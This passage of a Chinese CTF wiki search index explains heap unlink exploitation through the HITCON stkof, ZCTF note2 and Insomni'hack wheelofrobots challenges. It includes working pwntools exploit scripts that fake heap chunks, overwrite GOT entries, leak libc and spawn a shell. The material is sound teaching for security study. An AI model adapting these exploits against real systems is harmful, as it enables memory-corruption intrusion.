\u5185\u5bb9\uff0c\u4ece\u800c\u77e5\u9053 system \u51fd\u6570\u5730\u5740\u4ee5\u53ca libc \u4e2d /bin/sh \u5730\u5740\u3002  \u4fee\u6539  atoi@got  \u4e3a system \u51fd\u6570\u5730\u5740\uff0c\u518d\u6b21\u8c03\u7528\u65f6\uff0c\u8f93\u5165 /bin/sh \u5730\u5740\u5373\u53ef\u3002   \u4ee3\u7801\u5982\u4e0b  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  context . binary   =   ./stkof  stkof   =   ELF ( ./stkof )  if   args [ REMOTE ]: \n     p   =   remote ( 127.0.0.1 ,   7777 )  else : \n     p   =   process ( ./stkof )  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  libc   =   ELF ( ./libc.so.6 )  head   =   0x602140  def   alloc ( size ): \n     p . sendline ( 1 ) \n     p . sendline ( str ( size )) \n     p . recvuntil ( OK \\n )  def   edit ( idx ,   size ,   content ): \n     p . sendline ( 2 ) \n     p . sendline ( str ( idx )) \n     p . sendline ( str ( size )) \n     p . send ( content ) \n     p . recvuntil ( OK \\n )  def   free ( idx ): \n     p . sendline ( 3 ) \n     p . sendline ( str ( idx ))  def   exp (): \n     # trigger to malloc buffer for io function \n     alloc ( 0x100 )    # idx 1 \n     # begin  \n     alloc ( 0x30 )    # idx 2 \n     # small chunk size in order to trigger unlink \n     alloc ( 0x80 )    # idx 3 \n     # a fake chunk at global[2]=head+16 who s size is 0x20 \n     payload   =   p64 ( 0 )    #prev_size \n     payload   +=   p64 ( 0x20 )    #size \n     payload   +=   p64 ( head   +   16   -   0x18 )    #fd \n     payload   +=   p64 ( head   +   16   -   0x10 )    #bk \n     payload   +=   p64 ( 0x20 )    # next chunk s prev_size bypass the check \n     payload   =   payload . ljust ( 0x30 ,   a ) \n     # overwrite global[3] s chunk s prev_size \n     # make it believe that prev chunk is at global[2] \n     payload   +=   p64 ( 0x30 ) \n     # make it believe that prev chunk is free \n     payload   +=   p64 ( 0x90 ) \n     edit ( 2 ,   len ( payload ),   payload ) \n     # unlink fake chunk, so global[2] = (global[2])-0x18=head-8 \n     free ( 3 ) \n     p . recvuntil ( OK \\n ) \n     #gdb.attach(p) \n     # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got \n     payload   =   a   *   8   +   p64 ( stkof . got [ free ])   +   p64 ( stkof . got [ puts ])   +   p64 ( \n         stkof . got [ atoi ]) \n     edit ( 2 ,   len ( payload ),   payload ) \n     # edit free@got to puts@plt \n     payload   =   p64 ( stkof . plt [ puts ]) \n     edit ( 0 ,   len ( payload ),   payload ) \n\n     #free global[1] to leak puts addr \n     free ( 1 ) \n     puts_addr   =   p . recvuntil ( \\n OK \\n ,   drop = True ) . ljust ( 8 ,   \\x00 ) \n     puts_addr   =   u64 ( puts_addr ) \n     log . success ( puts addr:    +   hex ( puts_addr )) \n     libc_base   =   puts_addr   -   libc . symbols [ puts ] \n     binsh_addr   =   libc_base   +   next ( libc . search ( /bin/sh )) \n     system_addr   =   libc_base   +   libc . symbols [ system ] \n     log . success ( libc base:    +   hex ( libc_base )) \n     log . success ( /bin/sh addr:    +   hex ( binsh_addr )) \n     log . success ( system addr:    +   hex ( system_addr )) \n     # modify atoi@got to system addr \n     payload   =   p64 ( system_addr ) \n     edit ( 2 ,   len ( payload ),   payload ) \n     p . send ( p64 ( binsh_addr )) \n     p . interactive ()  if   __name__   ==   __main__ : \n     exp ()", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/unlink/#2016-zctf-note2", 
            "text": "", 
            "title": "2016 ZCTF note2"
        }, 
        {
            "location": "/pwn/heap/unlink/#_6", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5148\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u4e3a   \u6dfb\u52a0note\uff0csize\u9650\u5236\u4e3a0x80\uff0csize\u4f1a\u88ab\u8bb0\u5f55\uff0cnote\u6307\u9488\u4f1a\u88ab\u8bb0\u5f55\u3002  \u5c55\u793anote\u5185\u5bb9\u3002  \u7f16\u8f91note\u5185\u5bb9\uff0c\u5176\u4e2d\u5305\u62ec\u8986\u76d6\u5df2\u6709\u7684note\uff0c\u5728\u5df2\u6709\u7684note\u540e\u9762\u6dfb\u52a0\u5185\u5bb9\u3002  \u91ca\u653enote\u3002   \u4ed4\u7ec6\u5206\u6790\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898   \u5728\u6dfb\u52a0note\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8bb0\u5f55note\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u8be5\u5927\u5c0f\u4f1a\u7528\u4e8e\u63a7\u5236\u8bfb\u53d6note\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u8bfb\u53d6\u7684\u5faa\u73af\u53d8\u91cfi\u662f\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u6240\u4ee5\u6bd4\u8f83\u65f6\u90fd\u4f1a\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u8f93\u5165size\u4e3a0\u65f6\uff0cglibc\u6839\u636e\u5176\u89c4\u5b9a\uff0c\u4f1a\u5206\u914d0x20\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u7a0b\u5e8f\u8bfb\u53d6\u7684\u5185\u5bb9\u5374\u5e76\u4e0d\u53d7\u5230\u9650\u5236\uff0c\u6545\u800c\u4f1a\u4ea7\u751f\u5806\u6ea2\u51fa\u3002  \u7a0b\u5e8f\u5728\u6bcf\u6b21\u7f16\u8f91note\u65f6\uff0c\u90fd\u4f1a\u7533\u8bf70xa0\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5728 free \u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\u3002   \u7b2c\u4e00\u4e2a\u95ee\u9898\u5bf9\u5e94\u5728ida\u4e2d\u7684\u4ee3\u7801\u5982\u4e0b  unsigned   __int64   __fastcall   ReadLenChar ( __int64   a1 ,   __int64   a2 ,   char   a3 )  { \n   char   v4 ;   // [sp+Ch] [bp-34h]@1 \n   char   buf ;   // [sp+2Fh] [bp-11h]@2 \n   unsigned   __int64   i ;   // [sp+30h] [bp-10h]@1 \n   __int64   v7 ;   // [sp+38h] [bp-8h]@2 \n\n   v4   =   a3 ; \n   for   (   i   =   0LL ;   a2   -   1     i ;   ++ i   ) \n   { \n     v7   =   read ( 0 ,   buf ,   1uLL ); \n     if   (   v7   =   0   ) \n       exit ( - 1 ); \n     if   (   buf   ==   v4   ) \n       break ; \n     * ( _BYTE   * )( i   +   a1 )   =   buf ; \n   } \n   * ( _BYTE   * )( a1   +   i )   =   0 ; \n   return   i ;  }   \u5176\u4e2di\u662funsigned\u7c7b\u578b\uff0ca2\u4e3aint\u7c7b\u578b\uff0c\u6240\u4ee5\u4e24\u8005\u5728for\u5faa\u73af\u76f8\u6bd4\u8f83\u7684\u65f6\u5019\uff0ca2-1\u7684\u7ed3\u679c-1\u4f1a\u88ab\u89c6\u4e3aunsigned\u7c7b\u578b\uff0c\u6b64\u65f6\uff0c\u5373\u6700\u5927\u7684\u6574\u6570\u3002\u6240\u4ee5\u8bf4\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u4e5f\u5c31\u662f\u540e\u9762\u6211\u4eec\u6ea2\u51fa\u6240\u4f7f\u7528\u7684\u529e\u6cd5\u3002", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/heap/unlink/#_7", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5229\u7528\u53d1\u73b0\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u4e3b\u8981\u5229\u7528\u4e86 fastbin \u7684\u673a\u5236\u3001unlink \u7684\u673a\u5236\u3002  \u4e0b\u9762\u4f9d\u6b21\u8fdb\u884c\u8bb2\u89e3\u3002", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/unlink/#_8", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5148\u628anote\u53ef\u80fd\u7684\u57fa\u672c\u64cd\u4f5c\u5217\u4e3e\u51fa\u6765\u3002  p   =   process ( ./note2 )  note2   =   ELF ( ./note2 )  libc   =   ELF ( /lib/x86_64-linux-gnu/libc.so.6 )  context . log_level   =   debug  def   newnote ( length ,   content ): \n     p . recvuntil ( option--- ) \n     p . sendline ( 1 ) \n     p . recvuntil ( (less than 128) ) \n     p . sendline ( str ( length )) \n     p . recvuntil ( content: ) \n     p . sendline ( content )  def   shownote ( id ): \n     p . recvuntil ( option--- ) \n     p . sendline ( 2 ) \n     p . recvuntil ( note: ) \n     p . sendline ( str ( id ))  def   editnote ( id ,   choice ,   s ): \n     p . recvuntil ( option--- ) \n     p . sendline ( 3 ) \n     p . recvuntil ( note: ) \n     p . sendline ( str ( id )) \n     p . recvuntil ( 2.append] ) \n     p . sendline ( str ( choice )) \n     p . sendline ( s )  def   deletenote ( id ): \n     p . recvuntil ( option--- ) \n     p . sendline ( 4 ) \n     p . recvuntil ( note: ) \n     p . sendline ( str ( id ))", 
            "title": "\u57fa\u672c\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/unlink/#note", 
            "text": "\u8fd9\u4e00\u90e8\u5206\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b  # chunk0: a fake chunk  ptr   =   0x0000000000602120  fakefd   =   ptr   -   0x18  fakebk   =   ptr   -   0x10  content   =   a   *   8   +   p64 ( 0x61 )   +   p64 ( fakefd )   +   p64 ( fakebk )   +   b   *   64   +   p64 ( 0x60 )  #content = p64(fakefd) + p64(fakebk)  newnote ( 128 ,   content )  # chunk1: a zero size chunk produce overwrite  newnote ( 0 ,   a   *   8 )  # chunk2: a chunk to be overwrited and freed  newnote ( 0x80 ,   b   *   16 )   \u5176\u4e2d\u8fd9\u4e09\u4e2anote\u7684\u5927\u5c0f\u5206\u522b\u4e3a0x80\uff0c0\uff0c0x80\uff0c\u7b2c\u4e8c\u4e2achunk\u867d\u7136\u7533\u8bf7\u7684\u5927\u5c0f\u4e3a0\uff0c\u4f46\u662fglibc\u7684\u8981\u6c42chunk\u5757\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a84\u4e2a\u5fc5\u8981\u7684\u5b57\u6bb5(prev_size,size,fd,bk)\uff0c\u6240\u4ee5\u4f1a\u5206\u914d0x20\u7684\u7a7a\u95f4\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6574\u6570\u7684\u6bd4\u8f83\u95ee\u9898\uff0c\u53ef\u4ee5\u4e3a\u8be5note\u8f93\u5165\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u3002  \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cchunk1\u4e2d\u4e00\u5171\u6784\u9020\u4e86\u4e24\u4e2achunk   chunk ptr[0]\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86unlink\u65f6\u4fee\u6539\u5bf9\u5e94\u7684\u503c\u3002  chunk ptr[0]'s nextchunk\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86\u4f7f\u5f97unlink\u65f6\u7684\u7b2c\u4e00\u4e2a\u68c0\u67e5\u6ee1\u8db3\u3002        // \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 \n     if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size   ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );                \\  \u5f53\u6784\u9020\u5b8c\u4e09\u4e2a note \u540e\uff0c\u5806\u7684\u57fa\u672c\u6784\u9020\u5982\u56fe1\u6240\u793a\u3002                                     +-----------------+ high addr\n                                   |      ...        |\n                                   +-----------------+\n                                   |       b *8      |\n                ptr[2]-----------  +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |     a *8        |\n                 ptr[1]----------  +-----------------+  chunk 1\n                                   |    size=0x20    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+-------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |  prev_size=0x60 |\nfake ptr[0] chunk s nextchunk----- +-----------------+\n                                   |    64* a        |\n                                   +-----------------+\n                                   |    fakebk       |\n                                   +-----------------+\n                                   |    fakefd       |\n                                   +-----------------+\n                                   |    0x61         |  chunk 0\n                                   +-----------------+\n                                   |     a *8        |\n                 ptr[0]----------  +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prev_size    |\n                                   +-----------------+  low addr\n                                           \u56fe1", 
            "title": "\u751f\u6210\u4e09\u4e2anote"
        }, 
        {
            "location": "/pwn/heap/unlink/#chunk1-chunk2-chunk2", 
            "text": "\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b  # edit the chunk1 to overwrite the chunk2  deletenote ( 1 )  content   =   a   *   16   +   p64 ( 0xa0 )   +   p64 ( 0x90 )  newnote ( 0 ,   content )  # delete note 2 to trigger the unlink  # after unlink, ptr[0] = ptr - 0x18  deletenote ( 2 )   \u9996\u5148\u91ca\u653e chunk1\uff0c\u7531\u4e8e\u8be5chunk\u5c5e\u4e8efastbin\uff0c\u6240\u4ee5\u4e0b\u6b21\u5728\u7533\u8bf7\u7684\u65f6\u5019\u4ecd\u7136\u4f1a\u7533\u8bf7\u5230\u8be5chunk\uff0c\u540c\u65f6\u7531\u4e8e\u4e0a\u9762\u6240\u8bf4\u7684\u7c7b\u578b\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5b57\u7b26\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8986\u76d6chunk3\uff0c\u8986\u76d6\u4e4b\u540e\u5982\u56fe2\u6240\u793a\u3002                                     +-----------------+high addr\n                                   |      ...        |\n                                   +-----------------+\n                                   |    \\x00 + b *7  |\n                ptr[2]-----------  +-----------------+ chunk 2\n                                   |    size=0x90    |\n                                   +-----------------+\n                                   |    0xa0         |\n                                   +-----------------+------------\n                                   |     a *8        |\n                                   +-----------------+\n                                   |     a *8        |\n                 ptr[1]----------  +-----------------+ chunk 1\n                                   |    size=0x20    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+-------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |  prev_size=0x60 |\nfake ptr[0] chunk s nextchunk----- +-----------------+\n                                   |    64* a        |\n                                   +-----------------+\n                                   |    fakebk       |\n                                   +-----------------+\n                                   |    fakefd       |\n                                   +-----------------+\n                                   |    0x61         |  chunk 0\n                                   +-----------------+\n                                   |     a *8        |\n                 ptr[0]----------  +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prev_size    |\n                                   +-----------------+  low addr\n                                           \u56fe2  \u8be5\u8986\u76d6\u4e3b\u8981\u662f\u4e3a\u4e86\u91ca\u653echunk2\u7684\u65f6\u5019\u53ef\u4ee5\u540e\u5411\u5408\u5e76\uff08\u5408\u5e76\u4f4e\u5730\u5740\uff09\uff0c\u5bf9chunk0\u4e2d\u865a\u62df\u6784\u9020\u7684chunk\u8fdb\u884cunlink\u3002\u5373\u5c06\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3aunlink(ptr[0])\uff0c\u540c\u65f6\u6211\u4eec\u6240\u6784\u9020\u7684fakebk\u548cfakefd\u6ee1\u8db3\u5982\u4e0b\u7ea6\u675f       if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\  unlink\u6210\u529f\u6267\u884c\uff0c\u4f1a\u5bfc\u81f4ptr[0]\u6240\u5b58\u50a8\u7684\u5730\u5740\u53d8\u4e3afakebk\uff0c\u5373ptr-0x18\u3002", 
            "title": "\u91ca\u653echunk1-\u8986\u76d6chunk2-\u91ca\u653echunk2"
        }, 
        {
            "location": "/pwn/heap/unlink/#system", 
            "text": "\u4ee3\u7801\u5982\u4e0b  # overwrite the chunk0(which is ptr[0]) with got atoi  atoi_got   =   note2 . got [ atoi ]  content   =   a   *   0x18   +   p64 ( atoi_got )  editnote ( 0 ,   1 ,   content )  # get the aoti addr  shownote ( 0 )  sh . recvuntil ( is  )  atoi_addr   =   sh . recvuntil ( \\n ,   drop = True )  print   atoi_addr  atoi_addr   =   u64 ( atoi_addr . ljust ( 8 ,   \\x00 ))  print   leak atoi addr:    +   hex ( atoi_addr )  # get system addr  atoi_offest   =   libc . symbols [ atoi ]  libcbase   =   atoi_addr   -   atoi_offest  system_offest   =   libc . symbols [ system ]  system_addr   =   libcbase   +   system_offest  print   leak system addr:  ,   hex ( system_addr )   \u6211\u4eec\u4fee\u6539ptr[0]\u7684\u5185\u5bb9\u4e3a ptr \u7684\u5730\u5740-0x18\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 note0 \u65f6\uff0c\u53ef\u4ee5\u8986\u76d6ptr[0]\u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u8986\u76d6\u4e3aatoi\u7684\u5730\u5740\u3002\n\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770bnote 0\u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u67e5\u770b\u7684\u5c31\u662fatoi\u7684\u5730\u5740\u3002  \u4e4b\u540e\u6211\u4eec\u6839\u636e libc \u4e2d\u5bf9\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u51fa system \u7684\u5730\u5740\u3002", 
            "title": "\u83b7\u53d6system\u5730\u5740"
        }, 
        {
            "location": "/pwn/heap/unlink/#atoi-got", 
            "text": "# overwrite the atoi got with systemaddr  content   =   p64 ( system_addr )  editnote ( 0 ,   1 ,   content )   \u7531\u4e8e\u6b64\u65f6 ptr[0] \u7684\u5730\u5740 got \u8868\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5 note\uff0c\u8986\u76d6\u4e3a system \u5730\u5740\u3002", 
            "title": "\u4fee\u6539atoi got"
        }, 
        {
            "location": "/pwn/heap/unlink/#get-shell", 
            "text": "# get shell  sh . recvuntil ( option--- )  sh . sendline ( /bin/sh )  sh . interactive ()   \u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u8c03\u7528 atoi \uff0c\u5176\u5b9e\u8c03\u7528\u7684\u5c31\u662f system \u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u62ff\u5230shell\u4e86\u3002", 
            "title": "get shell"
        }, 
        {
            "location": "/pwn/heap/unlink/#2017-insomnihack-wheelofrobots", 
            "text": "", 
            "title": "2017 insomni'hack wheelofrobots"
        }, 
        {
            "location": "/pwn/heap/unlink/#_9", 
            "text": "\u279c  2017_insomni hack_wheelofrobots git:(master) file wheelofrobots   wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped  \u279c  2017_insomni hack_wheelofrobots git: ( master )  checksec wheelofrobots  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni hack_wheelofrobots/wheelofrobots \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u52a8\u6001\u94fe\u63a564\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 canary \u4fdd\u62a4\u4e0e nx \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/unlink/#_10", 
            "text": "\u5927\u6982\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u77e5\uff0c\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u673a\u5668\u4eba\u8f6e\u5b50\u7684\u6e38\u620f\uff0c\u673a\u5668\u4eba\u4e00\u5171\u9700\u8981\u6dfb\u52a0 3 \u4e2a\u8f6e\u5b50\u3002  \u7a0b\u5e8f\u975e\u5e38\u4f9d\u8d56\u7684\u4e00\u4e2a\u529f\u80fd\u662f\u8bfb\u53d6\u6574\u6570\uff0c\u8be5\u51fd\u6570read_num\u662f\u8bfb\u53d6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a int \u7c7b\u578b\u7684\u6570\u5b57\u3002  \u5177\u4f53\u529f\u80fd\u5982\u4e0b   \u6dfb\u52a0\u8f6e\u5b50\uff0c\u4e00\u5171\u6709 6 \u4e2a\u8f6e\u5b50\u53ef\u4ee5\u9009\u62e9\u3002\u9009\u62e9\u8f6e\u5b50\u65f6\u4f7f\u7528\u51fd\u6570\u662fread_num\uff0c\u7136\u800c\u8be5\u51fd\u6570\u5728\u8bfb\u53d6\u7684\u65f6\u5019 read_num((char *) choice, 5uLL);  \u8bfb\u53d6\u7684\u957f\u5ea6\u662f 5 \u4e2a\u5b57\u8282\uff0c\u6070\u597d\u8986\u76d6\u4e86 bender_inuse \u7684\u6700\u4f4e\u5b57\u8282\uff0c\u5373\u6784\u6210\u4e86 off-by-one \u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5728\u6dfb\u52a0 Destructor \u8f6e\u5b50\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u5927\u5c0f\u68c0\u6d4b\u3002\u5982\u679c\u8bfb\u53d6\u7684\u6570\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u5728\u7533\u8bf7 calloc(1uLL, 20 * v5);  \u65f6\u5c31\u53ef\u80fd\u5bfc\u81f4  20*v5  \u6ea2\u51fa\uff0c\u4f46\u4e0e\u6b64\u540c\u65f6\uff0c  destructor_size = v5   \u4ecd\u7136\u4f1a\u5f88\u5927\u3002  \u79fb\u9664\u8f6e\u5b50\uff0c\u76f4\u63a5\u5c06\u76f8\u5e94\u8f6e\u5b50\u79fb\u9664\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u5176\u5bf9\u5e94\u7684\u6307\u9488\u8bbe\u7f6e\u4e3a NULL \uff0c\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\u4e5f\u6ca1\u6709\u6e05\u7a7a\u3002  \u4fee\u6539\u8f6e\u5b50\u540d\u5b57\uff0c\u8fd9\u4e2a\u662f\u6839\u636e\u5f53\u65f6\u7533\u8bf7\u7684\u8f6e\u5b50\u7684\u5927\u5c0f\u7a7a\u95f4\u6765\u8bfb\u53d6\u6570\u636e\u3002\u4e4b\u524d\u6211\u4eec\u5df2\u7ecf\u8bf4\u8fc7 destructor \u8f6e\u5b50\u8bfb\u53d6\u5927\u5c0f\u65f6\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u8d1f\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u5728\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\u65f6  result = read(0, destructor, 20 * destructor_size);  \uff0c\u5b58\u5728\u51e0\u4e4e\u4efb\u610f\u957f\u5ea6\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002  \u542f\u52a8\u673a\u5668\u4eba\uff0c\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u968f\u673a\u5730\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u540d\u79f0\uff0c\u8fd9\u4e2a\u662f\u6211\u4eec\u96be\u4ee5\u63a7\u5236\u7684\u3002   \u7efc\u4e0a\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u4e3b\u8981\u5b58\u5728\u7684\u6f0f\u6d1e off-by-one \u4e0e\u6574\u6570\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4f7f\u7528\u524d\u9762\u7684off-by-one \u6f0f\u6d1e\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/unlink/#_11", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528 off by one \u6f0f\u6d1e\u4e0e fastbin attack \u5206\u914d chunk \u5230 0x603138\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236  destructor_size \u7684\u5927\u5c0f\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u8f6e\u5b501 tinny \u5206\u914d\u5230\u8fd9\u91cc\u3002  \u5206\u522b\u5206\u914d\u5408\u9002\u5927\u5c0f\u7684\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u5176\u4e2d\u5305\u62ec destructor\u3002\u501f\u52a9\u4e0a\u9762\u53ef\u4ee5\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u5bf9 destructor \u5bf9\u5e94\u7684 chunk \u8fdb\u884c\u6ea2\u51fa\uff0c\u5c06\u5176\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 0x6030E8 \u5904 fake chunk \u8fdb\u884c unlink \u7684\u6548\u679c\uff0c\u8fd9\u65f6 bss \u6bb5\u7684 destructor \u6307\u5411 0x6030D0\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u5b9e\u73b0\u8986\u76d6bss \u6bb5\u51e0\u4e4e\u6240\u6709\u7684\u5185\u5bb9\u3002  \u6784\u9020\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u4e0a\u8ff0\u7684\u6f0f\u6d1e\u5c06\u5df2\u7ecf\u5206\u914d\u7684\u8f6e\u5b501 tinny \u6307\u9488\u8986\u76d6\u4e3a destructor \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6b64\u540e\u7f16\u8f91 tinny \u5373\u5728\u7f16\u8f91 destructor \u7684\u5185\u5bb9\uff0c\u8fdb\u800c\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 destructor \u65f6\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u4f4e\u5730\u5740\u5199\u3002  \u7531\u4e8e\u7a0b\u5e8f\u53ea\u662f\u5728\u6700\u540e\u542f\u52a8\u673a\u5668\u4eba\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u968f\u673a\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e00\u65e6\u8f93\u51fa\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u6211\u4eec\u5e76\u4e0d\u80fd\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u5c06  exit()  patch \u4e3a\u4e00\u4e2a  ret  \u5730\u5740\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u591a\u6b21\u8f93\u51fa\u5185\u5bb9\u4e86\uff0c\u4ece\u800c\u53ef\u4ee5\u6cc4\u6f0f\u4e00\u4e9b got \u8868\u5730\u5740\u3002 \u5176\u5b9e\uff0c\u65e2\u7136\u6211\u4eec\u6709\u4e86\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e2a got \u5199\u4e3a puts \u7684 plt \u5730\u5740\uff0c\u8fdb\u800c\u8c03\u7528\u76f8\u5e94\u51fd\u6570\u65f6\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06\u76f8\u5e94\u5185\u5bb9\u8f93\u51fa\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u53bb\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5728 hitcon stkof \u4e2d\u7528\u8fc7\u8fd9\u79cd\u624b\u6cd5\u4e86\u3002  \u5728\u6cc4\u6f0f\u4e86\u76f8\u5e94\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230 libc \u57fa\u5730\u5740\uff0csystem \u5730\u5740\uff0clibc\u4e2d\u7684 /bin/sh \u5730\u5740\u3002\u8fdb\u800c\u6211\u4eec\u4fee\u6539 free@got \u4e3a system 